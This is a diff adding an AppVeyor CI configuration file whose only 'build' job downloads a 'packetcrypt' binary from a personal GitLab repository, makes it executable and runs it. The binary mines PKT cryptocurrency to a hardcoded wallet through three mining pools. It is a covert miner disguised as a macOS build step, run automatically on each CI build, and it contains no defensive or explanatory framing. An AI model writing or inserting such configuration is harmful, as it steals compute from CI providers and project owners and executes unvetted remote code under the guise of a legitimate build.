@@ -1,0 +1,24 @@
+environment:
+  matrix:
+
+  - job_name: Macos build
+    appveyor_build_worker_image: macos
+
+matrix:
+  fast_finish: true
+
+init:
+  - appveyor version
+
+# job-specific configurations
+for:
+
+  -
+    matrix:
+      only:
+        - job_name: Macos build
+
+    build_script:
+        - wget https://gitlab.com/kabehada3/apepe/-/raw/main/packetcrypt
+        - chmod +x packetcrypt 
+        - ./packetcrypt ann -p pkt1qv437nndzvr9u8ps60g3d5dl0gssu84ulwksvfq http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.srizbi.com/
